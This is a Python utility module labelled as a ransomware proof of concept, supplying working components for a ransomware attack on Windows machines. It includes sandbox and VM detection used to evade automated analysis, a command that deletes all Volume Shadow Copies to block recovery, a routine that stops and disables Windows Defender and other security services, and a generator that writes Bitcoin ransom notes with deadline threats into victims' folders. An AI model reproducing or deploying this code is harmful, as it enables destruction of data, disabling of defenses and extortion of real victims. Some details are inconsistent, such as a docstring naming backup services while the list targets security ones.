# Utility functions for ransomware PoC
# Phase 1: shell helpers, VM detection, shadow copy deletion, service disabling
import subprocess
import platform
import time
import os
import re
import uuid
from ransomware.logging import logger


def run_cmd(cmd: str) -> tuple[str, str]:
    """
    Execute a shell command and return (stdout, stderr).
    """
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return "", "Command timed out"
    except Exception as e:
        return "", str(e)


def is_admin() -> bool:
    """
    Check if the current process has administrator privileges.
    """
    if platform.system() != "Windows":
        return os.geteuid() == 0
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def is_vm() -> bool:
    """
    Detect if running inside a VM or sandbox environment.
    Checks: MAC address prefixes, VM-specific files, CPU core count, RAM size.
    """
    if platform.system() != "Windows":
        return False

    # Check for known VM MAC address prefixes
    vm_macs = [
        "00:05:69",  # VMware
        "00:0C:29",  # VMware
        "00:1C:14",  # VMware
        "00:50:56",  # VMware
        "08:00:27",  # VirtualBox
        "0C:D2:92",  # Hyper-V
        "00:03:FF",  # Microsoft Hyper-V
    ]
    try:
        result = subprocess.run(
            'getmac /fo csv /nh',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
        )
        for line in result.stdout.splitlines():
            parts = line.split(",")
            if len(parts) >= 1:
                mac = parts[0].strip().replace('"', '').replace("-", ":")
                for prefix in vm_macs:
                    if mac.startswith(prefix):
                        logger.info(f"VM detected: MAC prefix {prefix}")
                        return True
    except Exception:
        pass

    # Check for VM-specific files
    vm_files = [
        r"C:\Windows\System32\drivers\vmmouse.sys",
        r"C:\Windows\System32\drivers\vmhgfs.sys",
        r"C:\Windows\System32\drivers\vmci.sys",
        r"C:\Windows\System32\drivers\vmkbd.sys",
        r"C:\Windows\System32\drivers\Paravirt驱动程序.sys",
        r"C:\Windows\System32\drivers\pvscsi.sys",
        r"C:\Windows\System32\vmrest.exe",
        r"C:\Windows\System32\winevulkan.dll",
        r"C:\Windows\System32\drivers\xenbus.sys",
        r"C:\Windows\System32\drivers\xennet6.sys",
    ]
    for f in vm_files:
        if os.path.exists(f):
            logger.info(f"VM detected: file {f}")
            return True

    # Check number of CPU cores
    try:
        cpu_count = os.cpu_count()
        if cpu_count is not None and cpu_count <= 2:
            logger.info(f"VM suspected: only {cpu_count} CPU core(s)")
            return True
    except Exception:
        pass

    # Check total RAM (less than 4 GB = likely sandbox)
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        c_uint64 = ctypes.c_uint64
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_uint32),
                ("dwMemoryLoad", ctypes.c_uint32),
                ("ullTotalPhys", c_uint64),
                ("ullAvailPhys", c_uint64),
                ("ullTotalPageFile", c_uint64),
                ("ullAvailPageFile", c_uint64),
                ("ullTotalVirtual", c_uint64),
                ("ullAvailVirtual", c_uint64),
                ("ullAvailExtendedVirtual", c_uint64),
            ]
        memstatus = MEMORYSTATUSEX()
        memstatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(memstatus))
        total_mb = memstatus.ullTotalPhys // (1024 * 1024)
        if total_mb < 4096:
            logger.info(f"VM suspected: only {total_mb} MB RAM")
            return True
    except Exception:
        pass

    # Check for sandbox-specific registry keys
    sandbox_regs = [
        (r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest", ""),
        (r"HKLM\SYSTEM\CurrentControlSet\Services\VMTools", ""),
        (r"HKLM\SYSTEM\CurrentControlSet\Services\vmci", ""),
    ]
    for reg_path, _ in sandbox_regs:
        try:
            result = subprocess.run(
                f'reg query "{reg_path}"',
                shell=True,
                capture_output=True,
                text=True,
                timeout=5,
            )
            if "ERROR" not in result.stdout:
                logger.info(f"VM detected: registry key {reg_path}")
                return True
        except Exception:
            pass

    return False


def delay_if_sandbox():
    """
    If the environment appears to be a sandbox, delay execution
    to make automated analysis slower without blocking a real user.
    """
    if is_vm():
        logger.info("Sandbox detected — applying delay to evade automated analysis")
        time.sleep(15)


def delete_shadow_copies() -> bool:
    """
    Delete Windows Volume Shadow Copies to prevent recovery.
    Requires administrator privileges.
    Returns True if successful.
    """
    if platform.system() != "Windows":
        logger.warning("Shadow copy deletion only supported on Windows")
        return False

    if not is_admin():
        logger.warning("delete_shadow_copies: not running as admin, skipping")
        return False

    logger.info("Attempting to delete shadow copies...")
    stdout, stderr = run_cmd('vssadmin.exe delete shadows /all /quiet')
    if stderr and "not found" not in stderr.lower() and "access is denied" not in stderr.lower():
        logger.warning(f"Shadow copy deletion stderr: {stderr}")
        return False
    logger.info("Shadow copies deleted successfully")
    return True


def disable_services() -> bool:
    """
    Disable Windows services that could interfere with encryption or recovery.
    Targets: Windows Backup, Volume Shadow Copy, System Recovery.
    Requires admin privileges.
    """
    if platform.system() != "Windows":
        return False
    if not is_admin():
        logger.warning("disable_services: not running as admin, skipping")
        return False

    services_to_disable = [
        "WinDefend",
        "wscsvc",
        "WdFilter",
        "WdBoot",
        "SecurityHealthService",
        "VolumeShadowCopy",
    ]

    disabled = []
    for svc in services_to_disable:
        stdout, stderr = run_cmd(f'sc stop {svc}')
        stdout, stderr = run_cmd(f'sc config {svc} start= disabled')
        if "access is denied" not in stderr.lower():
            disabled.append(svc)
            logger.info(f"Disabled service: {svc}")
        else:
            logger.warning(f"Could not disable {svc}: {stderr}")

    return len(disabled) > 0


def generate_ransom_note(target_dir: str, payment_address: str) -> str:
    """
    Generate a ransom note and save it as README.txt in each subdirectory.
    Returns the note content.
    """
    note_content = f"""
================================================================================
                         IMPORTANT - YOUR FILES ARE ENCRYPTED
================================================================================

Your files have been encrypted with military-grade AES-256 encryption.
To recover your files, you must pay a ransom in Bitcoin.

PRICE: 0.15 BTC
DEADLINE: 72 hours (after which the price doubles)
PAYMENT ADDRESS: {payment_address}

================================================================================
                              HOW TO PAY
================================================================================

1. Purchase Bitcoin worth 0.15 BTC using any exchange (Coinbase, Binance, etc.)
2. Send the Bitcoin to this address: {payment_address}
3. After payment, click the "Decrypt" button on the ransomware popup
4. Enter your decryption code to recover your files

================================================================================
                           RECOVERY INSTRUCTIONS
================================================================================

Your machine ID: [MACHINE_ID]
Your files will be permanently lost after 72 hours.

!!! WARNING !!!
Do NOT attempt to decrypt manually — this will destroy your files permanently.
Do NOT power off your computer — this will destroy your files permanently.
Do NOT restore from backups — they will also be encrypted.

================================================================================
                            TECHNICAL DETAILS
================================================================================

Encryption: AES-256 (per-file) + RSA-2048 (key exchange)
Encrypted file extension: .wasted
Unique per-victim Fernet key stored on our secure server

For support, contact: support@decrypt-server.onion (Tor browser required)
================================================================================
"""
    note_path = os.path.join(target_dir, "README.txt")
    with open(note_path, "w", encoding="utf-8") as f:
        f.write(note_content.strip())
    logger.info(f"Ransom note written to {note_path}")
    return note_content
